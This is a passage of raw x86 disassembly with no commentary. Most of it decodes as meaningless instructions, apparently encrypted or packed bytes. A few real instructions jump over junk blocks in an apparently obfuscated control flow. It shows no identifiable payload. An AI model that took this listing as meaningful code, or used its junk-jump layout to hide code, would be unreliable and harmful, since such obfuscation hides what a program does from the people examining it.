  40ee4e:	or     eax,0xc786af8d
  40ee53:	add    BYTE PTR [ebp-0x31],cl
  40ee56:	pop    ds
  40ee57:	(bad)  
  40ee58:	jo     0x40eec4
  40ee5a:	mov    BYTE PTR [esi],ah
  40ee5c:	xor    al,0xe3
  40ee5e:	add    DWORD PTR [esi+0x6e],0xffffffb1
  40ee62:	dec    ecx
  40ee63:	stos   DWORD PTR es:[edi],eax
  40ee64:	mov    ebx,edx
  40ee66:	inc    ebx
  40ee67:	push   0xffffffa6
  40ee69:	mov    ch,0x12
  40ee6b:	jg     0x40eee0
  40ee6d:	popa   
  40ee6e:	int    0xf5
  40ee70:	int3   
  40ee71:	dec    edi
  40ee72:	imul   edi,DWORD PTR [eax-0x26a667b6],0x3b
  40ee79:	mov    dh,0xa0
  40ee7b:	nop
  40ee7c:	mul    dl
  40ee7e:	mov    cl,0xd5
  40ee80:	pop    esi
  40ee81:	sub    cl,cl
  40ee83:	sub    ch,BYTE PTR [ebp-0x7b]
  40ee86:	cli    
  40ee87:	push   0x3e
  40ee89:	or     eax,0xd3f5317b
  40ee8e:	pop    es
  40ee8f:	addr16 or eax,0xe32ad37b
  40ee95:	retf   
  40ee96:	push   ds
  40ee97:	rcl    WORD PTR [eax],0x32
  40ee9b:	movaps xmm1,XMMWORD PTR [eax]
  40ee9e:	gs out dx,eax
  40eea0:	inc    eax
  40eea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eea2:	rol    BYTE PTR [ebx+0x5fe29af5],0x60
  40eea9:	aaa    
  40eeaa:	or     eax,0x549c3841
  40eeaf:	sub    eax,DWORD PTR [ebx-0x1b]
  40eeb2:	adc    DWORD PTR [edi+0x29c01ee0],esp
  40eeb8:	(bad)  [edx+eax*4+0x58]
  40eebc:	push   eax
  40eebd:	into   
  40eebe:	popf   
  40eebf:	mov    ch,0xe1
  40eec1:	push   ecx
  40eec2:	cmp    BYTE PTR [edi],ch
  40eec4:	push   ss
  40eec5:	out    dx,eax
  40eec6:	stc    
  40eec7:	fcmovne st,st(1)
  40eec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeca:	add    ebp,DWORD PTR [ebp+eiz*4+0x5e]
  40eece:	dec    eax
  40eecf:	inc    esp
  40eed0:	mov    WORD PTR [ebx+edx*2],?
  40eed3:	dec    esp
  40eed4:	lea    edi,[ebx-0xeb8f69e]
  40eeda:	xchg   ecx,eax
  40eedb:	mov    bl,0x30
  40eedd:	and    dl,BYTE PTR [ebx+0x473d2c70]
  40eee3:	test   dl,ah
  40eee5:	mov    esi,0xbbabb260
  40eeea:	jmp    0x40eeb6
  40eeec:	fcom   QWORD PTR [edx-0x29]
  40eeef:	cdq    
  40eef0:	fxch   st(7)
  40eef2:	out    dx,eax
  40eef3:	or     DWORD PTR [edi+eax*8+0x5f3d7a4a],0x7d8e3aa8
  40eefe:	div    ch
  40ef00:	push   edi
  40ef01:	fsub   st,st(1)
  40ef03:	mov    esi,0xf6626a9e
  40ef08:	scas   eax,DWORD PTR es:[edi]
  40ef09:	adc    DWORD PTR [esi],0xffffffc9
  40ef0c:	aaa    
  40ef0d:	sub    ebp,DWORD PTR [eax]
  40ef0f:	je     0x40eeba
  40ef11:	add    edx,edx
  40ef13:	mov    eax,0xb44ab4a1
  40ef18:	imul   esp,DWORD PTR [esi+eiz*4-0x401a01d8],0xffffffa7
  40ef20:	mov    cl,0xef
  40ef22:	sub    ch,BYTE PTR [eax]
  40ef24:	or     DWORD PTR [ecx+0x5f],esp
  40ef27:	mov    dl,BYTE PTR [ebx+0x158191f7]
  40ef2d:	mov    BYTE PTR [edx],bh
  40ef2f:	mov    esi,0xac983d1e
  40ef34:	jg     0x40ef5a
  40ef36:	and    al,0x59
  40ef38:	into   
  40ef39:	or     BYTE PTR [ebp+0x26ba9756],al
  40ef3f:	cmp    BYTE PTR [esi-0x36828d2a],ch
  40ef45:	repnz clc 
  40ef47:	jae    0x40eefa
  40ef49:	add    edi,DWORD PTR [ecx-0x4360aae9]
  40ef4f:	cmp    DWORD PTR [ebx],eax
  40ef51:	shr    cl,cl
  40ef53:	push   ecx
  40ef54:	mov    ?,WORD PTR [esi-0x2b782d3d]
  40ef5a:	fidivr DWORD PTR [esi]
  40ef5c:	and    al,cl
  40ef5e:	ins    BYTE PTR es:[edi],dx
  40ef5f:	pop    ecx
  40ef60:	jl     0x40efc9
  40ef62:	fsub   DWORD PTR [edx-0x3326c63a]
  40ef68:	pop    ebx
  40ef69:	ret    
  40ef6a:	jg     0x40ef33
  40ef6c:	mov    ah,0x6
  40ef6e:	add    BYTE PTR [ebx+0x2b],bl
  40ef71:	imul   edi,ecx,0xffffffc5
  40ef74:	ror    edi,0x7a
  40ef77:	je     0x40ef4b
  40ef79:	cmc    
  40ef7a:	retf   0xe5f2
  40ef7d:	pop    ebx
  40ef7e:	xor    ah,BYTE PTR [esi+0x6c]
  40ef81:	lods   al,BYTE PTR ds:[esi]
  40ef82:	pop    esp
  40ef83:	call   0xad178021
  40ef88:	pusha  
  40ef89:	mov    al,ds:0x4bc20de4
  40ef8e:	dec    eax
  40ef8f:	ret    0xa8de
  40ef92:	mov    ds,WORD PTR [ebp+0x629f7bc]
  40ef98:	ret    
  40ef99:	dec    edx
  40ef9a:	loop   0x40eff4
  40ef9c:	shl    DWORD PTR [edx],cl
  40ef9e:	pop    ds
  40ef9f:	push   0xd8741d2f
  40efa4:	inc    ecx
  40efa5:	fnstcw WORD PTR [edx-0x52457446]
  40efab:	sbb    edi,DWORD PTR [ecx+0x4f]
  40efae:	pop    ebx
  40efaf:	inc    ecx
  40efb0:	lock ror dh,1
  40efb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efb4:	fs mov al,0xa7
  40efb7:	fcmovnu st,st(6)
  40efb9:	xchg   edi,eax
  40efba:	mov    dl,0x8f
  40efbc:	js     0x40ef60
  40efbe:	fsub   QWORD PTR [ebx]
  40efc0:	loop   0x40f024
  40efc2:	(bad)  
  40efc3:	cmp    bh,BYTE PTR [ecx-0x18a96a6c]
  40efc9:	mov    WORD PTR [ebx],es
  40efcb:	push   ecx
  40efcc:	retf   
  40efcd:	inc    edx
  40efce:	(bad)  
  40efcf:	mov    esi,edx
  40efd1:	leave  
  40efd2:	mov    ss,eax
  40efd4:	sub    bh,BYTE PTR [edi]
  40efd6:	and    esi,DWORD PTR [ecx]
  40efd8:	bound  edi,QWORD PTR [eax+0x2f30014a]
  40efde:	or     DWORD PTR [edi+0x1f],0xda7831ed
  40efe5:	or     eax,0xeb619dc2
  40efea:	pop    ds
  40efeb:	jns    0x40f02e
  40efed:	sub    DWORD PTR [eax],ebx
  40efef:	mov    cl,0x3b
  40eff1:	inc    ecx
  40eff2:	sbb    eax,0x2267cac9
  40eff7:	lods   al,BYTE PTR ds:[esi]
  40eff8:	loop   0x40f05b
  40effa:	call   0x5b33:0x6cfd9e2d
  40f001:	retf   0xafd6
  40f004:	fild   QWORD PTR [edi+0x22da073c]
  40f00a:	add    BYTE PTR [bp+si-0x1dda],0xb8
  40f010:	in     eax,0xbd
  40f012:	in     eax,0x60
  40f014:	fsub   st(3),st
  40f016:	push   0x59
  40f018:	add    bh,0x57
  40f01b:	mov    al,ds:0x8ec488b2
  40f020:	daa    
  40f021:	loopne 0x40f09b
  40f023:	std    
  40f024:	sbb    BYTE PTR [edx+0x4055b734],0x69
  40f02b:	mov    ecx,0x470f2916
  40f030:	fstp   st(4)
  40f032:	jbe    0x40f078
  40f034:	or     eax,0x7f61e300
  40f039:	retf   0x4311
  40f03c:	jae    0x40f0a4
  40f03e:	arpl   bp,cx
  40f040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f041:	adc    al,0x91
  40f043:	mov    cs,eax
  40f045:	nop
  40f046:	jmp    0x9116c048
  40f04b:	outs   dx,DWORD PTR ds:[esi]
  40f04c:	mov    ebp,0x64cec547
  40f051:	fsubr  QWORD PTR [ebp-0x2a]
  40f054:	push   ss
  40f055:	and    eax,0x88786b1
  40f05a:	call   0xd208:0x54054053
  40f061:	jp     0x40eff2
  40f063:	enter  0x696d,0x16
  40f067:	mov    dh,0xb5
  40f069:	ret    
  40f06a:	push   edi
  40f06b:	jmp    0x2aec:0xf9bd8a64
  40f072:	xchg   esp,eax
  40f073:	fild   QWORD PTR [edx+edx*4]
  40f076:	mov    esp,0x7fd5e833
  40f07b:	mov    ds:0x404b5180,al
  40f080:	scas   al,BYTE PTR es:[edi]
  40f081:	mov    ebp,0x948e05b0
  40f086:	xlat   BYTE PTR ds:[ebx]
  40f087:	dec    edi
  40f088:	out    dx,eax
  40f089:	int    0x9d
  40f08b:	cld    
  40f08c:	jp     0x40f02a
  40f08e:	ret    
  40f08f:	mov    cl,0x3a
  40f091:	mov    ch,0x9e
  40f093:	test   al,0xeb
  40f095:	push   ds
  40f096:	push   0x1d
  40f098:	loop   0x40f0bd
  40f09a:	xlat   BYTE PTR ds:[ebx]
  40f09b:	sti    
  40f09c:	ret    0x298a
  40f09f:	je     0x40f11b
  40f0a1:	push   edx
  40f0a2:	dec    edi
  40f0a3:	call   0xf746:0x46b4202
  40f0aa:	test   DWORD PTR [eax+eiz*1],ebx
  40f0ad:	retf   0x82c2
  40f0b0:	sub    cl,al
  40f0b2:	rcl    DWORD PTR ds:0x55d4,1
  40f0b7:	sbb    eax,0xcb70220
  40f0bc:	xor    cl,BYTE PTR [esp+ecx*2+0x31]
  40f0c0:	int3   
  40f0c1:	gs pop ebp
  40f0c3:	adc    eax,0x4e84215
  40f0c8:	(bad)  
  40f0ca:	loope  0x40f06f
  40f0cc:	callw  0x7de
  40f0d0:	rol    BYTE PTR [ecx],cl
  40f0d2:	cdq    
  40f0d3:	(bad)  
  40f0d4:	jl     0x40f08c
  40f0d6:	ret    0xcc10
  40f0d9:	fnstcw WORD PTR [esi-0x34c16042]
  40f0df:	xchg   DWORD PTR ds:[ecx+0xce9c3cd],ebp
  40f0e6:	imul   ebp,DWORD PTR [edi+0x563a72c6],0x17ea6d06
  40f0f0:	pop    ds
  40f0f1:	sub    dh,bl
  40f0f3:	rcl    BYTE PTR [ecx-0x44],1
  40f0f6:	shl    bl,1
  40f0f8:	out    0x90,al
  40f0fa:	mov    ?,WORD PTR [edi]
  40f0fc:	adc    BYTE PTR [ebx],bh
  40f0fe:	cld    
  40f0ff:	mov    ebx,0x43cc4d36
  40f104:	mov    ebx,0x289f5a6f
  40f109:	add    ecx,DWORD PTR [eax+0x24]
  40f10c:	mov    DWORD PTR [ebp-0x2c],ecx
  40f10f:	mov    eax,DWORD PTR [ebp-0x14]
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0x23
  40f12a:	jge    0x40f0de
  40f12c:	lods   al,BYTE PTR ds:[esi]
  40f12d:	pop    ebp
  40f12e:	mov    ds:0x7d497070,eax
  40f133:	jo     0x40f1a5
  40f135:	mov    eax,0x521a95e1
  40f13a:	push   es
  40f13b:	loope  0x40f17c
  40f13d:	pop    ecx
  40f13e:	(bad)  
  40f13f:	or     eax,0x7dd7f272
  40f144:	test   BYTE PTR [ecx-0x8],0x4c
  40f148:	mul    al
  40f14a:	pop    esi
  40f14b:	inc    esp
  40f14c:	pop    ds
  40f14d:	data16 rcl bh,cl
  40f150:	sub    DWORD PTR ds:0xac6424b,0xcfdb5010
  40f15a:	stos   BYTE PTR es:[edi],al
  40f15b:	sahf   
  40f15c:	ds imul edx,ebp,0x35
  40f160:	push   ebx
  40f161:	mov    ah,0xbc
  40f163:	cwde   
  40f164:	in     al,0x33
  40f166:	or     al,0x89
  40f168:	and    ecx,DWORD PTR [esi]
  40f16a:	inc    ebx
  40f16b:	fcmove st,st(0)
  40f16d:	mov    dh,0x2b
  40f16f:	mov    ebp,0xa41202dd
  40f174:	xchg   ebp,eax
  40f175:	mov    bh,bl
  40f177:	sub    edi,DWORD PTR [ecx]
  40f179:	xor    eax,0x71b3a9af
  40f17e:	mov    al,ds:0x8329bd2b
  40f183:	std    
  40f184:	xor    eax,0x660bed94
  40f189:	jbe    0x40f131
  40f18b:	movhps QWORD PTR [edi+0x6b0107b8],xmm1
  40f192:	xchg   esp,eax
  40f193:	or     edx,DWORD PTR [edx+ecx*8-0x48]
  40f197:	cld    
  40f198:	push   ebx
  40f199:	xchg   BYTE PTR [edi+0x54],bl
  40f19c:	jo     0x40f1dd
  40f19e:	call   DWORD PTR [ecx*2+0x3b946927]
  40f1a5:	add    BYTE PTR [ecx],bh
  40f1a7:	(bad)  
  40f1a8:	int    0x34
  40f1aa:	pop    esp
  40f1ab:	push   ds
  40f1ac:	lahf   
  40f1ad:	jb     0x40f143
  40f1af:	(bad)  
  40f1b0:	test   BYTE PTR [esi],bl
  40f1b2:	clc    
  40f1b3:	(bad)  
  40f1b4:	mov    bh,0x75
  40f1b6:	ffreep st(1)
  40f1b8:	and    BYTE PTR [eiz*1+0x1b39084c],ah
  40f1bf:	inc    ecx
  40f1c0:	push   eax
  40f1c1:	mov    edi,0xac657d3d
  40f1c6:	and    dh,BYTE PTR [ebx-0x31b6590]
  40f1cc:	pop    esi
  40f1cd:	dec    esi
  40f1ce:	rcl    BYTE PTR [eax],1
  40f1d0:	je     0x40f176
  40f1d2:	mov    edi,0x9709693f
  40f1d7:	es mov bh,0x36
  40f1da:	fldcw  WORD PTR [eax+ebx*4]
  40f1dd:	or     al,0xdf
  40f1df:	into   
  40f1e0:	test   BYTE PTR [ecx],dh
  40f1e2:	push   ebx
  40f1e3:	or     al,BYTE PTR [esi-0x54]
  40f1e6:	retf   0x2db7
  40f1e9:	jg     0x40f1ad
  40f1eb:	adc    ebx,DWORD PTR [esi+0x1609c3ab]
  40f1f1:	stos   DWORD PTR es:[edi],eax
  40f1f2:	mov    ds:0xb3343f66,eax
  40f1f7:	mov    BYTE PTR [eax+0x5a],ch
  40f1fa:	jecxz  0x40f1c9
  40f1fc:	(bad)  
  40f1fd:	fisubr DWORD PTR [ecx]
  40f1ff:	and    ch,ch
  40f201:	das    
  40f202:	int    0x4f
  40f204:	mov    al,0xf5
  40f206:	daa    
  40f207:	sahf   
  40f208:	stos   DWORD PTR es:[edi],eax
  40f209:	div    BYTE PTR [eax+0x7f]
  40f20c:	sbb    bh,al
  40f20e:	cmp    al,0x5d
  40f210:	inc    esp
  40f211:	add    BYTE PTR [esi],bl
  40f213:	jae    0x40f214
  40f215:	arpl   WORD PTR [ebp+eiz*1-0x25],si
  40f219:	fcomp  DWORD PTR [eax+0x4ea5bf7f]
  40f21f:	leave  
  40f220:	jle    0x40f1cb
  40f222:	out    dx,al
  40f223:	mov    ah,0x96
  40f225:	push   0xd
  40f227:	shr    DWORD PTR [eax+0xe],cl
  40f22a:	mov    ebp,0x8d83a8b7
  40f22f:	pop    edx
  40f230:	scas   al,BYTE PTR es:[edi]
  40f231:	cmp    esi,DWORD PTR [eax-0x68]
  40f234:	adc    al,0xe3
  40f236:	xor    ah,dh
  40f238:	test   BYTE PTR [eax+0x366f0a7e],al
  40f23e:	mov    edi,0x54cc2c8e
  40f243:	cdq    
  40f244:	mov    edx,0x21e55e18
  40f249:	ror    DWORD PTR [edi-0x13bb9b97],1
  40f24f:	sub    eax,0xf5d8e4cb
  40f254:	dec    edi
  40f255:	push   edx
  40f256:	outs   dx,DWORD PTR ds:[esi]
  40f257:	push   es
  40f258:	jae    0x40f25e
  40f25a:	add    al,BYTE PTR [eax+edx*8+0x69]
  40f25e:	pop    ss
  40f25f:	(bad)  
  40f260:	mov    ecx,0x708b2b18
  40f265:	sub    DWORD PTR [bp+di-0x4a],0xffffffe6
  40f26a:	mov    esi,0xc6b4936b
  40f26f:	and    BYTE PTR [ebp+eiz*4+0x70f0880c],cl
  40f276:	in     eax,0xdf
  40f278:	and    BYTE PTR [ebx+0x10],0x3a
  40f27c:	cmp    al,0xd6
  40f27e:	mov    ds:0xa3728483,al
  40f283:	cmp    al,0xd5
  40f285:	or     DWORD PTR [edi],0xc02a6bc1
  40f28b:	scas   al,BYTE PTR es:[edi]
  40f28c:	shl    DWORD PTR [esi-0x26],cl
  40f28f:	mov    dh,0x3b
  40f291:	shl    DWORD PTR [esi+0x6a],cl
  40f294:	shl    BYTE PTR [edx-0x4f],1
  40f297:	cmp    al,0x92
  40f299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f29a:	call   0xd856b3fb
  40f29f:	adc    cl,BYTE PTR [esi]
  40f2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2a2:	jne    0x40f2a9
  40f2a4:	hlt    
  40f2a5:	adc    ecx,DWORD PTR [esi-0x4d]
  40f2a8:	shr    DWORD PTR [edx+0x17],cl
  40f2ab:	sub    esp,DWORD PTR [edi]
  40f2ad:	sub    BYTE PTR [edx-0x4c],dl
  40f2b0:	xor    ch,BYTE PTR [esi]
  40f2b2:	sbb    dl,BYTE PTR ds:0xb706caa4
  40f2b8:	aas    
  40f2b9:	loopne 0x40f23e
  40f2bb:	or     eax,0xbb6df159
  40f2c0:	jge    0x40f2b4
  40f2c2:	dec    esp
  40f2c3:	xchg   ecx,eax
  40f2c4:	rol    DWORD PTR [ebp-0x7e],cl
  40f2c7:	jb     0x40f24e
  40f2c9:	popf   
  40f2ca:	mov    eax,ds:0x6d4f7696
  40f2cf:	popa   
  40f2d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2d1:	mov    ebx,0x9bf593a6
  40f2d6:	sbb    al,0xe9
  40f2d8:	inc    ebx
  40f2d9:	or     eax,DWORD PTR [edx+0xa]
  40f2dc:	ins    DWORD PTR es:[edi],dx
  40f2dd:	ss xchg ebp,eax
  40f2df:	test   al,0xef
  40f2e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2e2:	jmp    0x40f2ff
  40f2e4:	std    
  40f2e5:	call   0x429f6538
  40f2ea:	sub    ebx,DWORD PTR [eax+0x313e8eab]
  40f2f0:	pushf  
  40f2f1:	(bad)  
  40f2f3:	test   al,0x34
  40f2f5:	mov    ebx,0x873c547f
  40f2fa:	(bad)  
  40f2fb:	push   0x64
  40f2fd:	gs stc 
  40f2ff:	mov    bh,0x91
  40f301:	outs   dx,BYTE PTR ds:[esi]
  40f302:	cmp    al,0x48
  40f304:	and    BYTE PTR [ebp-0xb],0xb9
  40f308:	xchg   dh,dh
  40f30a:	cli    
  40f30b:	push   esp
  40f30c:	hlt    
  40f30d:	mov    BYTE PTR [ecx-0x30],dl
  40f310:	mov    dh,0x4b
  40f312:	mov    bl,0x7f
  40f314:	outs   dx,BYTE PTR ds:[esi]
  40f315:	test   eax,0xb1c26f65
  40f31a:	lock ret 
  40f31c:	fistp  QWORD PTR [esi+0x22]
  40f31f:	fcmovne st,st(0)
  40f321:	pop    ss
  40f322:	sub    ebx,DWORD PTR [ecx+0x24]
  40f325:	and    DWORD PTR [ebp-0x7eeb0134],edi
  40f32b:	cmp    BYTE PTR [ebx+0x4c],bh
  40f32e:	mov    cl,0x66
  40f330:	int    0xfc
  40f332:	in     eax,0x4b
  40f334:	xchg   ebx,eax
  40f335:	mov    es,WORD PTR [eax-0x12]
  40f338:	imul   BYTE PTR [ebx]
  40f33a:	sar    BYTE PTR [ecx-0x7045c191],cl
  40f340:	push   ebp
  40f341:	inc    esi
  40f342:	aas    
  40f343:	fstp   TBYTE PTR [ebx-0x68]
  40f346:	push   esi
  40f347:	jle    0x40f383
  40f349:	stos   DWORD PTR es:[edi],eax
  40f34a:	retf   0x21c6
  40f34d:	pop    esp
  40f34e:	dec    ebx
  40f34f:	std    
  40f350:	imul   esp,ebp,0x33
  40f353:	sbb    esi,DWORD PTR [ebx+0x2d416f4f]
  40f359:	jge    0x40f3cf
  40f35b:	inc    eax
  40f35c:	push   0x6cbc3492
  40f361:	in     al,0x20
  40f363:	push   ds
  40f364:	je     0x40f2ea
  40f366:	cmp    bh,BYTE PTR [esi]
  40f368:	mov    DWORD PTR [edx+ebp*2-0x51c0a4ec],esp
  40f36f:	aad    0xa
  40f371:	dec    edi
  40f372:	cmp    ch,0xa
  40f375:	cwde   
  40f376:	jmp    0xaf97b595
  40f37b:	nop
  40f37c:	mov    eax,0x45eb5f5c
  40f381:	jno    0x40f375
  40f383:	pop    edx
  40f384:	jge    0x40f347
  40f386:	jmp    0x578f5c19
  40f38b:	sub    bl,BYTE PTR [edi+0x29]
  40f38e:	or     DWORD PTR [ebx+ecx*4],edi
  40f391:	call   0xd8d1:0x58d71aff
  40f398:	mov    eax,ds:0x1ff6ec12
  40f39d:	push   esi
  40f39e:	int    0xaa
  40f3a0:	pop    ebp
  40f3a1:	xchg   edx,eax
  40f3a2:	shl    BYTE PTR [ecx+0x47],1
  40f3a5:	push   esp
  40f3a6:	mov    dl,0x79
  40f3a8:	inc    ecx
  40f3a9:	or     edx,esp
  40f3ab:	bound  ebp,QWORD PTR [ebx-0x16]
  40f3ae:	out    0x61,eax
  40f3b0:	outs   dx,BYTE PTR ds:[esi]
  40f3b1:	jge    0x40f3b8
  40f3b3:	hlt    
  40f3b4:	mov    ecx,0xaf745c92
  40f3b9:	iret   
  40f3ba:	dec    ebx
  40f3bb:	or     esi,0xd81a93c8
  40f3c1:	shl    DWORD PTR [ecx-0x48],0x9d
  40f3c5:	lea    di,[esi-0xf]
  40f3c9:	jns    0x40f3c4
  40f3cb:	ret    0x9c0
  40f3ce:	outs   dx,BYTE PTR ds:[esi]
  40f3cf:	fs ins BYTE PTR es:[edi],dx
  40f3d1:	mov    dl,0x1e
  40f3d3:	idiv   BYTE PTR [edx]
  40f3d5:	fucomi st,st(4)
  40f3d7:	jl     0x40f360
  40f3d9:	sar    BYTE PTR [edi],1
  40f3db:	mov    bh,BYTE PTR [ecx]
  40f3dd:	out    0x27,al
  40f3df:	data16 test BYTE PTR [ebp+0x17],al
  40f3e3:	add    eax,0x43eee9f3
  40f3e8:	leave  
  40f3e9:	das    
  40f3ea:	push   cs
  40f3eb:	push   ebp
  40f3ec:	or     dl,0xed
  40f3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3f0:	or     DWORD PTR [edi],0x322a3cdb
  40f3f6:	push   esi
  40f3f7:	jp     0x40f454
  40f3f9:	(bad)  
  40f3fa:	mov    al,ds:0xb164d1fd
  40f3ff:	sbb    edi,DWORD PTR [ecx]
  40f401:	mov    ds:0xd63cb833,ax
  40f407:	cmp    bh,BYTE PTR ds:0x51776e9a
  40f40d:	sti    
  40f40e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f40f:	loopne 0x40f474
  40f411:	inc    esi
  40f412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f413:	push   edx
  40f414:	aas    
  40f415:	or     eax,0xf5ccb9f9
  40f41a:	dec    eax
  40f41b:	mov    ds:0x9b2bcd52,al
  40f420:	stc    
  40f421:	mov    bl,0x82
  40f423:	sbb    ecx,esi
  40f425:	xor    edx,DWORD PTR [ebp+0x5bfac5e7]
  40f42b:	mov    dl,0xe4
  40f42d:	xor    bl,BYTE PTR [eax]
  40f42f:	sti    
  40f430:	jae    0x40f480
  40f432:	jge    0x40f491
  40f434:	sub    al,0xb3
  40f436:	pop    edx
  40f437:	aam    0x86
  40f439:	mov    dh,0x8c
  40f43b:	sub    al,0xc8
  40f43d:	je     0x40f3e5
  40f43f:	ja     0x40f451
  40f441:	gs push es
  40f443:	pop    esi
  40f444:	dec    esi
  40f445:	retf   0x4fdd
  40f448:	cmp    eax,edx
  40f44a:	js     0x40f3f2
  40f44c:	cmp    al,0xa4
  40f44e:	or     BYTE PTR [esi+0x57],dh
  40f451:	pop    edi
  40f452:	js     0x40f474
  40f454:	add    DWORD PTR [ebp-0x6d],ecx
  40f457:	fwait
  40f458:	lods   eax,DWORD PTR ds:[esi]
  40f459:	imul   edi,DWORD PTR [esp+eax*1],0xffffffe5
  40f45d:	shl    al,1
  40f45f:	sbb    DWORD PTR [eax+0x4d459e15],esp
  40f465:	js     0x40f419
  40f467:	div    BYTE PTR [eax+ebx*4-0x1a40e656]
  40f46e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f46f:	sbb    ecx,esi
  40f471:	imul   eax,DWORD PTR [ebx+edx*4],0x5f
  40f475:	in     eax,dx
  40f476:	jmp    0xff8849b1
  40f47b:	mov    ecx,0x842e7613
  40f480:	mov    bl,0x19
  40f482:	shl    DWORD PTR [edx+0x71],cl
  40f485:	add    ebp,DWORD PTR [ebp+0x1d9f6528]
  40f48b:	out    dx,eax
  40f48c:	push   ss
  40f48d:	loopne 0x40f4a8
  40f48f:	inc    edx
  40f490:	dec    edx
  40f491:	and    bh,BYTE PTR [eax+0x3643fabd]
  40f497:	mov    esp,0x64c61d3b
  40f49c:	out    0xc6,eax
  40f49e:	mov    cl,0x90
  40f4a0:	and    esi,ebp
  40f4a2:	test   BYTE PTR [ebx-0x76],bl
  40f4a5:	test   BYTE PTR [edi],0xa1
  40f4a8:	add    dh,ah
  40f4aa:	hlt    
  40f4ab:	jae    0x40f4e6
  40f4ad:	fwait
  40f4ae:	sbb    cl,ah
  40f4b0:	push   eax
  40f4b1:	or     al,0x79
  40f4b3:	leave  
  40f4b4:	pusha  
  40f4b5:	mov    ds:0x981ace72,eax
  40f4ba:	mov    al,0x7b
  40f4bc:	cs mov ebx,0x98814970
  40f4c2:	sbb    al,0x1d
  40f4c4:	pop    edi
  40f4c5:	pop    eax
  40f4c6:	rcr    dl,1
  40f4c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c9:	out    0xc9,eax
  40f4cb:	ja     0x40f464
  40f4cd:	push   ecx
  40f4ce:	fbld   TBYTE PTR [edx+0x2c]
  40f4d1:	in     al,dx
  40f4d2:	retf   
  40f4d3:	repz or eax,0xbe80f49c
  40f4d9:	call   0x4886:0xe56f598d
  40f4e0:	das    
  40f4e1:	aas    
  40f4e2:	mov    DWORD PTR [edi-0x651c0cc],0x7ce4961c
  40f4ec:	mov    ebx,0xcccc7a51
  40f4f1:	in     eax,dx
  40f4f2:	xchg   esi,eax
  40f4f3:	clc    
  40f4f4:	cmc    
  40f4f5:	es scas eax,DWORD PTR es:[edi]
  40f4f7:	ret    
  40f4f8:	add    esi,esp
  40f4fa:	jp     0x40f52e
  40f4fc:	stc    
  40f4fd:	mov    WORD PTR [edx+0x2742ab7f],ds
  40f503:	mov    al,bh
  40f505:	adc    al,BYTE PTR ds:0xf67c08b9
  40f50b:	stos   DWORD PTR es:[edi],eax
  40f50c:	xor    esi,esi
  40f50e:	mov    DWORD PTR [ebp-0x14],ecx
  40f511:	mov    eax,DWORD PTR [ebp-0x28]
  40f514:	jmp    0x40f908
  40f519:	sbb    al,0x75
  40f51b:	sar    DWORD PTR [esi+0x71b35a51],1
  40f521:	lahf   
  40f522:	popa   
  40f523:	sti    
  40f524:	arpl   WORD PTR [edi+0x2c],di
  40f527:	test   eax,0x70afb65e
  40f52c:	jo     0x40f577
  40f52e:	jge    0x40f5a0
  40f530:	jo     0x40f4c5
  40f532:	in     eax,0x91
  40f534:	in     eax,dx
  40f535:	stos   BYTE PTR es:[edi],al
  40f536:	pop    ecx
  40f537:	gs jne 0x40f591
  40f53a:	iret   
  40f53b:	loopne 0x40f5a5
  40f53d:	sbb    esi,DWORD PTR [edi-0x2289e6da]
  40f543:	lock fmul QWORD PTR [ebp-0xb]
  40f547:	sub    eax,0x96ecfed4
  40f54c:	rol    ah,cl
  40f54e:	xor    DWORD PTR [esi],esi
  40f550:	add    eax,0xaa6e0478
  40f555:	xor    bh,0x44
  40f558:	mov    eax,ds:0x47274fd2
  40f55d:	dec    esp
  40f55e:	sbb    DWORD PTR [ebp+0x60beed19],eax
  40f564:	jmp    0x670:0x1bccee53
  40f56b:	es sub ecx,esp
  40f56e:	aaa    
  40f56f:	inc    dl
  40f571:	shl    DWORD PTR [edi+0x3f6f5376],1
  40f577:	jns    0x40f582
  40f579:	mov    edi,0xa27af130
  40f57e:	xor    ebx,esp
  40f580:	adc    ebp,edx
  40f582:	cmp    cl,dh
  40f584:	fistp  WORD PTR [ecx+0x54325887]
  40f58a:	jle    0x40f50c
  40f58c:	push   edi
  40f58d:	imul   ecx,DWORD PTR es:[ebx],0xffffff81
  40f591:	cld    
  40f592:	jo     0x40f5d6
  40f594:	xchg   ecx,eax
  40f595:	stc    
  40f596:	into   
  40f597:	in     al,dx
  40f598:	mov    esp,0x93808869
  40f59d:	jecxz  0x40f580
  40f59f:	xor    esi,edi
  40f5a1:	push   esi
  40f5a2:	and    al,0xd2
  40f5a4:	sbb    al,0x75
  40f5a6:	cmp    eax,0xc9fb33c5
  40f5ab:	sub    bl,BYTE PTR [esi+0x7b]
  40f5ae:	fucom  st(7)
  40f5b0:	jmp    0x40f597
  40f5b2:	xlat   BYTE PTR ds:[ebx]
  40f5b3:	bound  ebx,QWORD PTR [ebx+ebp*8]
  40f5b6:	xchg   edi,eax
  40f5b7:	in     eax,0xf9
  40f5b9:	leave  
  40f5ba:	clc    
  40f5bb:	cli    
  40f5bc:	mov    al,0x15
  40f5be:	cmp    BYTE PTR [esi-0x530c396a],bh
  40f5c4:	popa   
  40f5c5:	inc    esp
  40f5c6:	jge    0x40f556
  40f5c8:	jmp    0x40f61f
  40f5ca:	je     0x40f58f
  40f5cc:	push   0x1f
  40f5ce:	(bad)  
